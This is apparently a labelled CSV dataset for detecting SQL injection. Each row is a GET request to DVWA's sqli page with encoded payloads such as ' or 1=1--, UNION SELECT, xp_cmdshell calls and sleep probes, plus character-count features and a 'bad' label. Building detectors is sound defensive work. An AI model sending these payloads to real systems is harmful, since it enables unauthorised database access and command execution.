Method,Path,Body,Single_q,Double_q,Dashes,Braces,Spaces,Bad_Words,class
GET,/DVWA/vulnerabilities/sqli/?id=%3D%2520%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%3D%2520%3B&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%3D%2520--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,1,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%5Cx23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%5Cx27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%5Cx3D%2520%5Cx3B%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%5Cx3D%2520%5Cx27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%5Cx27%5Cx4F%5Cx52%20SELECT%20%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%5Cx27%5Cx6F%5Cx72%20SELECT%20%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27or%2520select%20%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%3C%3E%22%27%25%3B%29%28%26%2B&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,1,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%2520or%2520%27%27%3D%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%2520or%2520%27x%27%3D%27x&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%2520or%2520%22x%22%3D%22x&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%2520or%2520%28%27x%27%3D%27x&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=0%20or%201%3D1&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%200%3D0%20--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,3,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%200%3D0%20--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,3,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=or%200%3D0%20--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,1,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%200%3D0%20%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,3,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%200%3D0%20%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,3,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=or%200%3D0%20%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%201%3D1--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%201%3D1--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%271%27%3D%271%27--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%27%20or%201%20--%27%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,2,1,0,3,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=or%201%3D1--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,1,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=or%25201%3D1&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=or%25201%3D1%20--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,1,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%201%3D1%20or%20%27%27%3D%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,4,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%201%3D1%20or%20%22%22%3D%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,4,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20a%3Da--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%20%22a%22%3D%22a&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20or%20%28%27a%27%3D%27a&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,1,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%20or%20%28%22a%22%3D%22a&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,1,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=hi%22%20or%20%22a%22%3D%22a&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=hi%22%20or%201%3D1%20--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,3,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=hi%27%20or%201%3D1%20--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,3,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=hi%27%20or%20%27a%27%3D%27a&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=hi%27%29%20or%20%28%27a%27%3D%27a&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,1,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=hi%22%29%20or%20%28%22a%22%3D%22a&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,1,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27hi%27%20or%20%27x%27%3D%27x%27%3B&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,6,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%40variable&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%2C%40variable&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=PRINT&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=PRINT%20%40%40variable&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=select&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=insert&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=as&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=or&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=procedure&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=limit&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=order%20by&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=asc&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=desc&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=delete&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=update&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=distinct&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=having&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=truncate&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=replace&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=like&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=handler&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=bfilename&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20username%20like%20%27%25&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,4,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20uname%20like%20%27%25&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,4,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20userid%20like%20%27%25&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,4,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20uid%20like%20%27%25&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,4,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20user%20like%20%27%25&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,4,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=exec%20xp&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=exec%20sp&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%3B%20exec%20master%2e%2exp_cmdshell&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,2,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%3B%20exec%20xp_regread&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,2,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=t%27exec%20master%2e%2exp_cmdshell%20%27nslookup%20www%2egoogle%2ecom%27--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,1,0,3,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=--sp_password&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,1,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%5Cx27UNION%20SELECT&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UNION%20SELECT&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,2,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UNION%20ALL%20SELECT&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,3,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%28EXISTS%29&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,1,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20%28select%20top%201&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,1,3,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%7C%7CUTL_HTTP%2eREQUEST&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=1%3BSELECT%2520%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=to_timestamp_tz&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=tz_offset&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%26lt%3B%26gt%3B%26quot%3B%27%25%3B%29%28%26amp%3B%2B&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%2520or%25201%3D1&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%2527%2520or%25201%3D1&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%2520%24%28sleep%252050%29&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%2520%27sleep%252050%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=char%254039%2541%252b%2540SELECT&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%26apos%3B%2520OR&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27sqlattempt1&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%28sqlattempt2%29&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%7C&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%257C&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%2A%7C&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%252A%257C&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%2A%28%7C%28mail%3D%2A%29%29&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,2,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%252A%2528%257C%2528mail%253D%252A%2529%2529&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%2A%28%7C%28objectclass%3D%2A%29%29&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,2,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%252A%2528%257C%2528objectclass%253D%252A%2529%2529&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%28&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%2528&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%29&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%2529&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%26&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%2526&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%21&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%2521&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%201%3D1%20or%20%27%27%3D%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,4,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%27%27%3D%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=x%27%20or%201%3D1%20or%20%27x%27%3D%27y&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,4,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%2f&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%2f%2f&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%2f%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%2A%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=or%201%3D1&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=or%201%3D1--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,1,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=or%201%3D1%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=or%201%3D1%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,1,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%20%271%27%3D%271&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%20%271%27%3D%271%27--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%20%271%27%3D%271%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%20%271%27%3D%271%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27or%201%3D1%20or%20%27%27%3D%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,3,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%201%3D1&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%201%3D1--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%201%3D1%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%201%3D1%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%28%271%27%3D%271&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,1,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%28%271%27%3D%271%27--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,1,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%28%271%27%3D%271%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,1,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%28%271%27%3D%271%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,1,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%271%27%3D%271&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%271%27%3D%271%27--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%271%27%3D%271%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%271%27%3D%271%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=1234%20%27%20AND%201%3D0%20UNION%20ALL%20SELECT%20%27admin%27%2C%20%2781dc9bdb52d04dc20036dbd8313ed055&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,8,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,1,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%20%221%22%3D%221&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%20%221%22%3D%221%22--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,1,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%20%221%22%3D%221%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%20%221%22%3D%221%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22or%201%3D1%20or%20%22%22%3D%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,3,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%201%3D1&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%201%3D1--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%201%3D1%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%201%3D1%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29%20or%20%28%221%22%3D%221&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,1,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29%20or%20%28%221%22%3D%221%22--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,1,1,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29%20or%20%28%221%22%3D%221%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,1,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29%20or%20%28%221%22%3D%221%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,1,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29%20or%20%221%22%3D%221&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29%20or%20%221%22%3D%221%22--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,1,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29%20or%20%221%22%3D%221%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,2,1,bad
